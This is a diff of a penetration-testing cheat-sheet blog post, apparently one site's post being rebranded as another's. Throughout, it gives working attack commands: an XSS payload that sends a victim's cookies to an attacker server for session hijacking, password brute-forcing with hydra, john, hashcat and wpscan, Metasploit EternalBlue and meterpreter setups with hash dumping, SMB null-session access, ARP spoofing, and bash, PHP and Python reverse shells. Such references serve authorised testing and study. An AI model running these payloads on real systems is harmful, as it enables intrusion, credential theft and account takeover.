+            <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>();<span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://192.168.99.102/log.php?q=&#34;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre>
+          </div>
+          <ol start="3">
+            <li>attacker: log into attacker logging server (P.S.: it is 192.168.99.102 in this example), and execute the
+              following command:</li>
+          </ol>
+          <pre><code>nc -vv -k -l -p 80
+</code></pre>
+          <ol start="4">
+            <li>
+              <p>attacker: when victim client pc browses the vulnerable server, check the output of the command above.
+              </p>
+            </li>
+            <li>
+              <p>attacker: after obtaining the victim&rsquo;s cookie, utilize a firefox&rsquo;s add-on called Cookie
+                Quick Manager to change to the victim&rsquo;s cookie in an effort to hijack the victim&rsquo;s
+                privilege.</p>
+            </li>
+          </ol>
+          <h3 id="bruteforce-hydra-john-hashcat">bruteforce (hydra, john, hashcat)</h3>
+          <p>wordlist generation</p>
+          <pre><code>cewl example.com -m 3 -w wordlist.txt
+</code></pre>
+          <p>hydra http basic auth brute</p>
+          <pre><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
+</code></pre>
+          <p>hydra brute http digest</p>
+          <pre><code>hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-get /admin/
+</code></pre>
+          <p>hydra brute http post form</p>
+          <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed&quot;
+</code></pre>
+          <p>hydra brute http authenticated post form</p>
+          <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^&amp;login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v&quot;
+</code></pre>
+          <p>hydra brute</p>
+          <pre><code>hydra -f -v -V -L users.txt -P rockyou-15.txt -s 2223 -f ssh://10.10.10.17
 hydra -v -V -l admin -P rockyou-10.txt ssh://10.10.10.18
-</code></pre><p>combine passwd with shadow file for john the ripper:</p>
-<pre><code>unshadow passwd shadow &gt; crack.hash
-</code></pre><p>john the ripper bruteforce:</p>
-<pre><code>john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
+</code></pre>
+          <p>combine passwd with shadow file for john the ripper:</p>
+          <pre><code>unshadow passwd shadow &gt; crack.hash
+</code></pre>
+          <p>john the ripper bruteforce:</p>
+          <pre><code>john -wordlist /usr/share/wordlists/rockyou.txt crack.hash
 john -wordlist /usr/share/wordlists/rockyou.txt -users users.txt test.hash
-</code></pre><p>hashcat:</p>
-<pre><code>hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
-</code></pre><h3 id="wpscan">wpscan</h3>
-<pre><code>wpscan --url http://10.10.10.14 --enumerate u
+</code></pre>
+          <p>hashcat:</p>
+          <pre><code>hashcat -m 1000 -a 0 -o found.txt --remove crack.hash rockyou-10.txt
+</code></pre>
+          <h3 id="wpscan">wpscan</h3>
+          <pre><code>wpscan --url http://10.10.10.14 --enumerate u
 wpscan --url example.com -e vp --plugins-detection mixed --api-token API_TOKEN
 wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt
 wpscan --url example.com -U admin -P /usr/share/wordlists/rockyou.txt
-</code></pre><h3 id="mysql">mysql</h3>
-<p>scan:</p>
-<pre><code>nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13
-</code></pre><p>examples:</p>
-<pre><code>mysql -h 10.10.10.23 -P 13306 -u root -p -e &quot;show databases;&quot;
+</code></pre>
+          <h3 id="mysql">mysql</h3>
+          <p>scan:</p>
+          <pre><code>nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.10.10.13
+</code></pre>
+          <p>examples:</p>
+          <pre><code>mysql -h 10.10.10.23 -P 13306 -u root -p -e &quot;show databases;&quot;
 mysql -h 10.10.10.23 -P 13306 -u root -p -e &quot;use mydb;show tables;&quot;
 mysql -h 10.10.10.23 -P 13306 -u root -p -e &quot;use mydb;select * from users;&quot;
-</code></pre><h3 id="msfconsole">msfconsole</h3>
-<p>search exploit</p>
-<pre><code>msf&gt; search cve:2011 port:135 platform:windows target:XP
-</code></pre><p>basic</p>
-<pre><code>msfconsole
+</code></pre>
+          <h3 id="msfconsole">msfconsole</h3>
+          <p>search exploit</p>
+          <pre><code>msf&gt; search cve:2011 port:135 platform:windows target:XP
+</code></pre>
+          <p>basic</p>
+          <pre><code>msfconsole
 use auxiliary/scanner/mssql/mssql_login
 set rhosts 10.10.10.110
 set rports 1433
@@ -424,31 +393,36 @@ set username admin
 set password 12345
 set verbose true
 run
-</code></pre><p>mssql payload</p>
-<pre><code>use exploit/windows/mssql/mssql_payload
+</code></pre>
+          <p>mssql payload</p>
+          <pre><code>use exploit/windows/mssql/mssql_payload
 set rhosts 10.10.10.177
 set rport 1433
 set srvport 53
 set username admin
 set password qwerty
 set payload windows/x64/meterpreter_reverse_tcp
-</code></pre><p>ssh login enumeration (bruteforce)</p>
-<pre><code>use auxiliary/scanner/ssh/ssh_login
+</code></pre>
+          <p>ssh login enumeration (bruteforce)</p>
+          <pre><code>use auxiliary/scanner/ssh/ssh_login
 show options
 set rhosts 10.10.10.133
 set user_file /usr/share/ncrack/minimal.usr
 set pass_file /usr/share/ncrack/minimal.usr
 set verbose true
 run
-</code></pre><p>eternal blue x86 architecture example:</p>
-<pre><code>use exploit/windows/smb/ms17_010_psexec
+</code></pre>
+          <p>eternal blue x86 architecture example:</p>
+          <pre><code>use exploit/windows/smb/ms17_010_psexec
 show options
-</code></pre><p>eternal blue x64 architecture example:</p>
-<pre><code>use exploit/windows/smb/ms17_010_eternalblue
+</code></pre>
+          <p>eternal blue x64 architecture example:</p>
+          <pre><code>use exploit/windows/smb/ms17_010_eternalblue
 show options
 set payload windows/x64/meterpreter/reverse_tcp
-</code></pre><h3 id="meterpreter">meterpreter</h3>
-<pre><code>meterpreter&gt;run autoroute -s 172.16.50.0/24
+</code></pre>
+          <h3 id="meterpreter">meterpreter</h3>
+          <pre><code>meterpreter&gt;run autoroute -s 172.16.50.0/24
 background
 
 sessions -l
@@ -463,15 +437,17 @@ upload x C:\\Windows
 shell
 
 use post/windows/gather/hashdump
-</code></pre><h3 id="windows-shares">windows shares</h3>
-<p>enumeration with smbclient</p>
-<pre><code>nmblookup -A 10.16.64.223
+</code></pre>
+          <h3 id="windows-shares">windows shares</h3>
+          <p>enumeration with smbclient</p>
+          <pre><code>nmblookup -A 10.16.64.223
 smbclient -L //10.16.64.223 -N share
 smbclient //10.16.64.223/share -N mount
 
 enum4linux -a 10.10.10.13
-</code></pre><p>enumeration with nmap:</p>
-<pre><code>ll /usr/share/nmap/scripts/ | grep smb-enum-
+</code></pre>
+          <p>enumeration with nmap:</p>
+          <pre><code>ll /usr/share/nmap/scripts/ | grep smb-enum-
 -rw-r--r-- 1 root root  4846 Jan  9  2019 smb-enum-domains.nse
 -rw-r--r-- 1 root root  5931 Jan  9  2019 smb-enum-groups.nse
 -rw-r--r-- 1 root root  8045 Jan  9  2019 smb-enum-processes.nse
@@ -481,132 +457,112 @@ enum4linux -a 10.10.10.13
 -rw-r--r-- 1 root root 12531 Jan  9  2019 smb-enum-users.nse
 
 nmap --script=smb-enum-users 192.168.1.10
-</code></pre><h4 id="null-sessions">null sessions</h4>
-<ol>
-<li>Use &ldquo;enum4linux -n&rdquo; to make sure if &ldquo;&lt;20&gt;&rdquo; exists:</li>
-</ol>
-<pre><code>enum4linux -n 192.168.1.10
-</code></pre><ol start="2">
-<li>If &ldquo;&lt;20&gt;&rdquo; exists, it means Null Session could be exploited. Utilize the following command to get more details:</li>
-</ol>
-<pre><code>enum4linux 192.168.1.10
-</code></pre><ol start="3">
-<li>If confirmed that Null Session exists, you can remotely list all share of the target:</li>
-</ol>
-<pre><code>smbclient -L WORKGROUP -I 192.168.1.10 -N -U &quot;&quot;
-</code></pre><ol start="4">
-<li>You also can connect the remote server by applying the following command:</li>
-</ol>
-<pre><code>smbclient \\\\192.168.1.10\\c$ -N -U &quot;&quot;
-</code></pre><ol start="5">
-<li>Download those files stored on the share drive:</li>
-</ol>
-<pre><code>smb: \&gt; get Congratulations.txt
-</code></pre><h3 id="arp-spoofing">ARP spoofing</h3>
-<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre>
+          <h4 id="null-sessions">null sessions</h4>
+          <ol>
+            <li>Use &ldquo;enum4linux -n&rdquo; to make sure if &ldquo;&lt;20&gt;&rdquo; exists:</li>
+          </ol>
+          <pre><code>enum4linux -n 192.168.1.10
+</code></pre>
+          <ol start="2">
+            <li>If &ldquo;&lt;20&gt;&rdquo; exists, it means Null Session could be exploited. Utilize the following
+              command to get more details:</li>
+          </ol>
+          <pre><code>enum4linux 192.168.1.10
+</code></pre>
+          <ol start="3">
+            <li>If confirmed that Null Session exists, you can remotely list all share of the target:</li>
+          </ol>
+          <pre><code>smbclient -L WORKGROUP -I 192.168.1.10 -N -U &quot;&quot;
+</code></pre>
+          <ol start="4">
+            <li>You also can connect the remote server by applying the following command:</li>
+          </ol>
+          <pre><code>smbclient \\\\192.168.1.10\\c$ -N -U &quot;&quot;
+</code></pre>
+          <ol start="5">
+            <li>Download those files stored on the share drive:</li>
+          </ol>
+          <pre><code>smb: \&gt; get Congratulations.txt
+</code></pre>
+          <h3 id="arp-spoofing">ARP spoofing</h3>
+          <pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
 arpspoof -i tap0 -t 10.13.37.100 -r 10.13.37.101
-</code></pre><h3 id="reverse-shell">reverse shell</h3>
-<p>bash</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.14.22/4444 0&gt;&amp;1
-</code></pre><p>php one line (bash)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.14.10/4444 0&gt;&amp;1&#39;&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></code></pre></div><p>python</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.0.14.22&#34;</span>,<span style="color:#ae81ff">4444</span>));os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>);os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);<span style="color:#f92672">import</span> pty; pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
-</code></pre></div>
-    </div>
-    
-      
+</code></pre>
+          <h3 id="reverse-shell">reverse shell</h3>
+          <p>bash</p>
+          <pre><code>bash -i &gt;&amp; /dev/tcp/10.0.14.22/4444 0&gt;&amp;1
+</code></pre>
+          <p>php one line (bash)</p>
+          <div class="highlight">
+            <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.0.14.10/4444 0&gt;&amp;1&#39;&#34;</span>); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre>
+          </div>
+          <p>python</p>
+          <div class="highlight">
+            <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.0.14.22&#34;</span>,<span style="color:#ae81ff">4444</span>));os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>);os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);<span style="color:#f92672">import</span> pty; pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
+</code></pre>
+          </div>
+          <p>Thanks for reading this post, if you like my work you can support by <a
+            href="https://www.buymeacoffee.com/hackerwasii">buying me a coffee</a>. ☕️</p>
+        </div>
         <div class="pagination">
           <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
+            <span class="pagination__title-h">Read other posts</span>
             <hr />
           </div>
           <div class="pagination__buttons">
-            
-              <span class="button previous">
-                <a href="https://bhavsec.com/posts/spring4shell/">
-                  <span class="button__icon">←</span>
-                  <span class="button__text">Spring4Shell 🍃</span>
-                </a>
-              </span>
-            
-            
-              <span class="button next">
-                <a href="https://bhavsec.com/posts/steel-mountain/">
-                  <span class="button__text">Steel Mountain 🏔</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
+            <span class="button previous">
+              <a href="https://www.hackerwasii.com/posts/spring4shell/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Spring4Shell 🍃</span>
+              </a>
+            </span>
+            <span class="button next">
+              <a href="https://www.hackerwasii.com/posts/steel-mountain/">
+                <span class="button__text">Steel Mountain 🏔</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
           </div>
         </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </div>
-
       </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      
-      <div class="copyright">
-        <span> 
-          © 2018-2022
-        </span>
-      </div>
-      <div>
-        <span>    
-        <span>
-        <a href="../../archive">archive</a>
-        &nbsp; 
-        </span>
-          <a href="../../newsletter">newsletter</a>
-        </span>   
-        &nbsp;      
-        <span>
-          <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
-        </span>
-        &nbsp;      
-        <span>
-          <a href="http://bhavsec.com/posts/index.xml" target=”_blank”>rss feed</a>
-        </span>
-
-      </div>
-
-    
-  </div>
-</footer>
-
-<script src="../../assets/main.js"></script>
-<script src="../../assets/prism.js"></script>
-
-      
     </div>
+    <!-- hackerwasii -->
+    <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-9670252621494000" data-ad-slot="1081579313"
+      data-ad-format="auto" data-full-width-responsive="true"></ins>
+    <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+    </script>
+    <footer class="footer">
+      <div class="footer__inner">
+        <div class="copyright">
+          <span>
+            © 2020-2022 Waseem Akram
+          </span>
+        </div>
+        <div>
+          <span>
+            <span>
+              <a href="../../archive">archive</a>
+              &nbsp;
+            </span>
+            <a href="../../newsletter">newsletter</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://creativecommons.org/licenses/by-nc/4.0/" target=”_blank”>license</a>
+          </span>
+          &nbsp;
+          <span>
+            <a href="https://www.hackerwasii.com/posts/index.xml" target=”_blank”>rss feed</a>
+          </span>
+        </div>
+      </div>
+    </footer>
+    <script src="../../assets/main.js"></script>
+    <script src="../../assets/prism.js"></script>
+  </div>
+</body>
 
-    
-      
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-VY7WJZSQD0"></script>
-<script>
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.dataLayer = window.dataLayer || [];
-	function gtag(){dataLayer.push(arguments);}
-	gtag('js', new Date());
-	gtag('config', 'G-VY7WJZSQD0', { 'anonymize_ip': false });
-}
-</script>
-
-    
-  </body>
 </html>
